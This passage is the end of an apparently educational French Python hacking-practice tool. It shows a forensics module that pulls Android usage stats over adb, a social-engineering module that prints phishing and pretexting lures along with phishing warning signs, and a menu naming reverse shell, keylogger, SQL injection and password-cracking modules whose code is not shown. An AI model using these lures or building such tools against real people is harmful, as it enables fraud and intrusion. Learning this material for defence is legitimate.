        ("Dernières apps", "shell dumpsys usagestats | head -20"),
    ]
    
    for name, cmd in forensic_data:
        print(f"\n  {Colors.CYAN}[{name}]{Colors.RESET}")
        result = run_adb(cmd)
        lines = result.strip().split('\n')[:5]
        for line in lines:
            if line.strip():
                print(f"    {line[:70]}")
    
    print(f"\n{Colors.GREEN}✅ Module Forensics terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MODULE 13: SOCIAL ENGINEERING
# ══════════════════════════════════════════════════════════════

def module_social_engineering():
    print(f"\n{Colors.CYAN}{'═'*70}")
    print(f"  🎭 MODULE 13: SOCIAL ENGINEERING")
    print(f"{'═'*70}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}[TECHNIQUES PRINCIPALES]{Colors.RESET}\n")
    
    techniques = [
        ("Phishing", "Faux emails/sites imitant des services légitimes", 
         "Email: 'Votre compte sera suspendu, cliquez ici'"),
        ("Pretexting", "Se faire passer pour quelqu'un de confiance",
         "Appel: 'Bonjour, je suis du support IT, j'ai besoin de votre mot de passe'"),
        ("Baiting", "Appât physique ou numérique",
         "Clé USB 'Salaires 2024' laissée dans le parking"),
        ("Quid Pro Quo", "Échange de service contre information",
         "'Je répare votre PC si vous me donnez accès'"),
        ("Tailgating", "Suivre quelqu'un dans une zone sécurisée",
         "Entrer derrière un employé avec badge"),
        ("Vishing", "Phishing par téléphone",
         "Appel de 'votre banque' demandant vos codes"),
        ("Smishing", "Phishing par SMS",
         "SMS: 'Colis en attente, cliquez pour suivre'"),
    ]
    
    for i, (name, desc, example) in enumerate(techniques, 1):
        print(f"  {Colors.CYAN}[{i}] {name}{Colors.RESET}")
        print(f"      {desc}")
        print(f"      {Colors.YELLOW}Ex: {example}{Colors.RESET}\n")
    
    print(f"{Colors.GREEN}[INDICATEURS DE PHISHING]{Colors.RESET}")
    indicators = [
        "URL suspecte (faceb00k.com au lieu de facebook.com)",
        "Urgence artificielle ('Votre compte sera fermé dans 24h')",
        "Fautes d'orthographe",
        "Demande d'informations sensibles",
        "Expéditeur inconnu ou usurpé",
        "Pièces jointes suspectes (.exe, .zip)",
    ]
    for ind in indicators:
        print(f"  ⚠️ {ind}")
    
    print(f"\n{Colors.GREEN}✅ Module Social Engineering terminé!{Colors.RESET}")

# ══════════════════════════════════════════════════════════════
#  MENU PRINCIPAL
# ══════════════════════════════════════════════════════════════

def main_menu():
    os.system('color')
    
    modules = {
        "1": ("📡 Reconnaissance Avancée", module_recon_avancee),
        "2": ("📦 Extraction Complète Android", module_extraction_complete),
        "3": ("📥 Téléchargement Fichiers", module_download_files),
        "4": ("💉 SQL Injection Lab", module_sql_injection_lab),
        "5": ("🔐 Password Cracking Avancé", module_password_cracking),
        "6": ("🌐 XSS Lab", module_xss_lab),
        "7": ("📶 Analyse WiFi", module_wifi_analysis),
        "8": ("🔄 Encodage/Décodage", module_encoding),
        "9": ("🐚 Reverse Shell Demo", module_reverse_shell),
        "10": ("⌨️ Keylogger Demo", module_keylogger_demo),
        "11": ("📱 Shell Android Interactif", module_android_shell),
        "12": ("🔍 Forensics", module_forensics),
        "13": ("🎭 Social Engineering", module_social_engineering),
    }
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        
        print(f"{Colors.YELLOW}MODULES DISPONIBLES:{Colors.RESET}\n")
        
        # Affichage en colonnes
        keys = list(modules.keys())
        for i in range(0, len(keys), 2):
            left = f"  [{keys[i]:>2}] {modules[keys[i]][0]}"
            if i+1 < len(keys):
                right = f"[{keys[i+1]:>2}] {modules[keys[i+1]][0]}"
                print(f"{Colors.CYAN}{left:<40}{right}{Colors.RESET}")
            else:
                print(f"{Colors.CYAN}{left}{Colors.RESET}")
        
        print(f"\n  {Colors.GREEN}[99]{Colors.RESET} 🚀 EXÉCUTER TOUS LES MODULES")
        print(f"  {Colors.RED}[0]{Colors.RESET}  ❌ Quitter\n")
        
        try:
            choice = input(f"{Colors.GREEN}Choix > {Colors.RESET}").strip()
        except:
            break
        
        if choice == "0":
            print(f"\n{Colors.GREEN}Merci d'avoir pratiqué! Continue à apprendre! 🎓{Colors.RESET}\n")
            break
        elif choice == "99":
            for key, (name, func) in modules.items():
                print(f"\n{Colors.MAGENTA}▶ Exécution: {name}{Colors.RESET}")
                try:
                    func()
                except Exception as e:
                    print(f"{Colors.RED}Erreur: {e}{Colors.RESET}")
                pause()
        elif choice in modules:
            try:
                modules[choice][1]()
            except Exception as e:
                print(f"{Colors.RED}Erreur: {e}{Colors.RESET}")
            pause()
        else:
            print(f"{Colors.RED}Option invalide!{Colors.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
